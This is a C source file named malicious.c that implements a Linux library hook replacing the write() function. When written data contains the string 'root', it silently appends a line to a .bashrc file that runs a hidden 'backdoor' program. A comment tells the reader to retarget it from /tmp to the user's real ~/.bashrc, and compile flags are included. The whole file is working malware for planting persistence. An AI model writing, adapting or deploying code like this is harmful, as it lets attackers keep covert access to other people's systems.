/*
*  @author: zerofrost🦊
*  @date: 2022-6-20
*  @description: Simple implementation of library hooking of function calls in Linux 
*  @compilation: gcc -ldl malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so

*/


#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>


#define TRIGGER_STRING "root"
#define TARGETFILE "/tmp/.bashrc" // Change this to /home/$USER/.bashrc
#define BACKDOOR_LINE "/home/$USER/.config/backdoor >/dev/null 2>&1"
#define LOGFILE "/tmp/logfile.txt"

ssize_t write(int filedescriptor,const void *buf,size_t nbytes){
	int result;
	ssize_t (*new_write)(int filedescriptor,const void *buf,size_t nbytes);
	new_write=dlsym(RTLD_NEXT,"write");
	umask(0);
	char *string_checker=strstr(buf,TRIGGER_STRING);
	if (string_checker != NULL){
			int fdes=open(TARGETFILE, O_CREAT | O_WRONLY | O_APPEND  ,0777 );
			if (fdes) {
				new_write(fdes,BACKDOOR_LINE,strlen(BACKDOOR_LINE));
				close(fdes);
				result=new_write(filedescriptor,buf,nbytes);
			}else{
				result=new_write(filedescriptor,buf,nbytes);				
			}
	}else{
		result=new_write(filedescriptor,buf,nbytes);
	}

	return result;

}
